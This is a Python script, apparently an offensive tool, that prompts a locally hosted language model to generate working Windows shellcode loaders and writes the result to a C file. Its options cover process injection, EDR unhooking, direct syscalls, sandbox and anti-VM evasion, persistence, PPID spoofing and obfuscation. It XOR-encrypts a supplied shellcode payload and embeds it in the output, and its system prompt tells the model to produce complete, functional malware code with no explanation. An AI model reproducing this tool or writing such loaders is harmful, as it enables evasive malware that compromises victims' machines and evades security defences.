import argparse
import logging
import json
import os
from openai import OpenAI
import re
from pathlib import Path

def setup_logging():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def load_configuration(config_file='config.json'):
    if os.path.exists(config_file):
        with open(config_file, 'r') as file:
            return json.load(file)
    return {}

def get_parameters(config):
    parser = argparse.ArgumentParser(description="Generate code based on specified parameters.")
    
    # Required parameters
    parser.add_argument("--allocation_method", type=str, required=True,
                       choices=["virtualprotect", "virtualalloc"],
                       help="Memory allocation method")
    parser.add_argument("--execution_method", type=str, required=True,
                       choices=["createremotethread", "timesetevent", "settimer", 
                               "etwpcreateetwthread", "fiber", "pointer"],
                       help="Shellcode execution method")
    
    # Optional parameters with None as default
    parser.add_argument("--language", type=str, default=config.get("language", "C"),
                       help="Programming language")
    parser.add_argument("--sleep_time", type=int,
                       help="Initial sleep delay in milliseconds")
    parser.add_argument("--unhooking_method", type=str,
                       choices=["patch_jmp", "text_section_rewrite"],
                       help="Unhooking method")
    parser.add_argument("--sleep_mask", type=str,
                       choices=["dynamic", "static"],
                       help="Sleep mask method")
    parser.add_argument("--pause_mechanic", type=str,
                       choices=["sleep", "busy_loop", "yield", "thread_sleep"],
                       help="Pausing mechanic")
    parser.add_argument("--sandbox_checks", type=str,
                       choices=["registry", "file_system", "processes", "behavioral"],
                       help="Sandbox checks")
    parser.add_argument("--sandbox_evasion", type=str,
                       choices=["process_hollowing", "moving_shellcode", "anti_vm", "other"],
                       help="Sandbox evasion techniques")
    parser.add_argument("--persistence", type=str,
                       choices=["registry", "startup", "scheduled_tasks", "autoruns"],
                       help="Persistence mechanisms")
    parser.add_argument("--encryption_method", type=str,
                       choices=["xor"],
                       default="xor",
                       help="Shellcode encryption method (XOR only)")
    parser.add_argument("--injection_target", type=str,
                       choices=["self", "remote", "early_bird"],
                       help="Injection target process")
    parser.add_argument("--process_creation", type=str,
                       choices=["normal", "suspended", "ppid_spoof"],
                       help="Process creation method")
    parser.add_argument("--memory_protection", type=str,
                       choices=["normal", "dynamic", "guard"],
                       help="Memory protection scheme")
    parser.add_argument("--thread_context", type=str,
                       choices=["standard", "fiber", "apc"],
                       help="Thread context manipulation")
    parser.add_argument("--syscall_method", type=str,
                       choices=["direct", "indirect", "hell"],
                       help="System call invocation method")
    
    # Boolean flags
    parser.add_argument("--anti_debugging", action="store_true",
                       help="Include anti-debugging techniques")
    parser.add_argument("--anti_virtualization", action="store_true",
                       help="Include anti-virtualization techniques")
    parser.add_argument("--network_communication", action="store_true",
                       help="Include network communication features")
    parser.add_argument("--obfuscation", action="store_true",
                       help="Include code obfuscation techniques")
    parser.add_argument("--stealth", action="store_true",
                       help="Include stealth evasion techniques")
    
    # Add new arguments for shellcode handling
    parser.add_argument("--shellcode_file", type=str,
                       help="Path to raw shellcode file")
    parser.add_argument("--xor_key", type=str,
                       default="default_key",
                       help="XOR encryption/decryption key")

    args = parser.parse_args()
    return vars(args)

def xor_encrypt_shellcode(shellcode_bytes, key):
    """Encrypt shellcode using XOR with the given key."""
    key_bytes = key.encode() if isinstance(key, str) else key
    encrypted = bytearray()
    for i, byte in enumerate(shellcode_bytes):
        encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
    return encrypted

def format_shellcode_array(encrypted_bytes):
    """Format encrypted shellcode as a C-style byte array."""
    return "unsigned char shellcode[] = {\n    " + \
           ", ".join(f"0x{b:02x}" for b in encrypted_bytes) + \
           "\n};"

def read_and_encrypt_shellcode(shellcode_path, xor_key):
    """Read shellcode file, encrypt it, and return C-style array."""
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()
    encrypted = xor_encrypt_shellcode(shellcode, xor_key)
    return format_shellcode_array(encrypted)

def generate_code(client, params, max_tokens=15000):
    # Modify the encryption_method choices to only include XOR
    # Update the system prompt to include XOR key information
    xor_key = params.get('xor_key', 'default_key')  # You'll need to add this to params
    
    system_prompt = [
        "You are an AI specialized in creating complete, functional shellcode loaders. ",
        "You must provide fully implemented code with NO placeholder functions or comments. ",
        "Every function must contain complete, working implementation logic. ",
        "IMPORTANT: Output ONLY the code block with NO explanations, descriptions, or comments.",
        "ANY text outside the code block will be ignored.",
        f"Language: {params.get('language', 'C')}, ",
        f"Allocation: {params['allocation_method']}, ",
        f"Execution: {params['execution_method']}, ",
        "Include all necessary Windows API calls, error handling, and proper memory management.",
        "Do not use placeholder comments or TODO statements.",
        f"XOR Key for Decryption: {xor_key}",
    ]
    
    # Add optional parameters to system prompt if they exist
    optional_params = {
        'sleep_mask': 'Sleep Mask',
        'pause_mechanic': 'Pause Mechanic',
        'unhooking_method': 'Unhooking Method',
        'sandbox_checks': 'Sandbox Checks',
        'sandbox_evasion': 'Sandbox Evasion',
        'persistence': 'Persistence',
        'encryption_method': 'Encryption',
        'injection_target': 'Injection Target',
        'process_creation': 'Process Creation',
        'memory_protection': 'Memory Protection',
        'thread_context': 'Thread Context',
        'syscall_method': 'Syscall Method'
    }
    
    for param, display_name in optional_params.items():
        if params.get(param):
            system_prompt.append(f"{display_name}: {params[param]}, ")
    
    # Add boolean flags if enabled
    boolean_params = {
        'anti_debugging': 'Anti-Debugging',
        'anti_virtualization': 'Anti-VM',
        'network_communication': 'Network Features',
        'obfuscation': 'Obfuscation',
        'stealth': 'Stealth'
    }
    
    for param, display_name in boolean_params.items():
        if params.get(param):
            system_prompt.append(f"{display_name}: enabled, ")
    
    system_prompt.append("Include detailed error handling and memory cleanup.")
    
    # Build user prompt dynamically
    user_prompt = [
        f"Generate a complete, production-ready {params.get('language', 'C')} shellcode loader that:\n",
        "1. Includes all necessary headers and imports\n",
        "2. Uses the variable name 'unsigned char shellcode[]' for the shellcode array.\n",
        "   Place '// [SHELLCODE_ARRAY]' where this array should be defined\n",
        "3. All code must reference 'shellcode' as the shellcode array variable name\n"
    ]
    
    # If sleep_time exists, this becomes item 3, and all subsequent items shift down
    if params.get('sleep_time'):
        user_prompt.append(f"3. Implements initial sleep/delay of {params['sleep_time']}ms\n")
    
    # Adjust the numbering for the remaining items
    
    # Add required parameters
    user_prompt.extend([
        f"{4 if params.get('sleep_time') else 3}. Uses {params['allocation_method']} for memory allocation\n",
        f"{5 if params.get('sleep_time') else 4}. Uses {params['execution_method']} for execution\n"
    ])
    
    # Add optional parameters if they exist
    prompt_index = 6
    for param, display_name in optional_params.items():
        if params.get(param):
            user_prompt.append(f"{prompt_index}. Implements {params[param]} for {display_name}\n")
            prompt_index += 1
    
    # Add boolean parameters if enabled
    for param, display_name in boolean_params.items():
        if params.get(param):
            user_prompt.append(f"{prompt_index}. Implements {display_name} techniques\n")
            prompt_index += 1
    
    user_prompt.extend([
        f"{prompt_index}. Includes proper memory cleanup and error handling\n",
        f"{prompt_index + 1}. Includes appropriate entry point (EXE format)\n",
        "Provide the complete code with proper structure and formatting."
    ])

    messages = [
        {"role": "system", "content": "".join(system_prompt)},
        {"role": "user", "content": "".join(user_prompt)}
    ]
    
    # Add validation check for placeholder content
    def validate_code(code):
        placeholder_patterns = [
            r'//\s*Placeholder\s*$',  # Only match exact "Placeholder" comments
            r'//\s*TODO\s*$',         # Only match exact "TODO" comments
            r'//.*\bimplementation needed\b',  # More specific implementation comment check
            r'void\s+\w+\(\)\s*{\s*}\s*$',    # Empty functions
            r'//.*\bplaceholder\b.*$',         # More specific placeholder comment check
            r'//\s*\[SHELLCODE_ARRAY\]'        # Check if shellcode array placeholder remains
        ]
        
        for pattern in placeholder_patterns:
            if re.search(pattern, code, re.IGNORECASE | re.MULTILINE):
                logging.warning(f"Found placeholder pattern: {pattern}")
                return False
        
        # Additional check for shellcode array definition
        if not re.search(r'unsigned\s+char\s+shellcode\s*\[\s*\]', code, re.MULTILINE):
            logging.warning("Shellcode array not properly defined")
            return False
        
        return True

    # Update the code generation and validation logic
    completion = client.chat.completions.create(
        model="model-identifier",
        messages=messages,
        max_tokens=max_tokens,
        temperature=0.7,
    )

    response_content = completion.choices[0].message.content
    code_block = re.search(r"```(?:\w+)?\s*([\s\S]*?)```", response_content, re.DOTALL)
    
    if code_block:
        code_content = code_block.group(1).strip()
        
        # Validate the generated code
        if not validate_code(code_content):
            logging.error("Generated code contains placeholder implementations")
            raise ValueError("Generated code contains incomplete implementations")

        # If shellcode file is provided, insert the encrypted shellcode
        if params.get('shellcode_file'):
            encrypted_shellcode = read_and_encrypt_shellcode(
                params['shellcode_file'], 
                params['xor_key']
            )
            # Insert the encrypted shellcode where the placeholder is
            code_content = code_content.replace(
                "// [SHELLCODE_ARRAY]",
                encrypted_shellcode
            )
        
        # Remove the template wrapping since the AI should provide complete code
        # We'll let the AI handle the full structure including headers, main/DllMain, etc.
        
        # Just write the code directly to file
        output_format = params.get("output_format", "EXE").upper()
        file_extension = "dll" if output_format == "DLL" else "c"  # Changed to .c for C files
        output_file = f"generated_code.{file_extension}"
        with open(output_file, "w") as file:
            file.write(code_content)
        
        logging.info(f"Code generated and saved to {output_file}")
        return code_content

    logging.warning("No code block found in the AI response")
    return "No code block found in the response."

if __name__ == "__main__":
    setup_logging()
    config = load_configuration()
    params = get_parameters(config)
    logging.info("Parameters retrieved: %s", params)

    client = OpenAI(base_url="http://192.168.0.210:443/v1", api_key="lm-studio")
    code_output = generate_code(client, params)

    print("Generated Code:\n")
    print("```")
    print(code_output.strip())
    print("```")
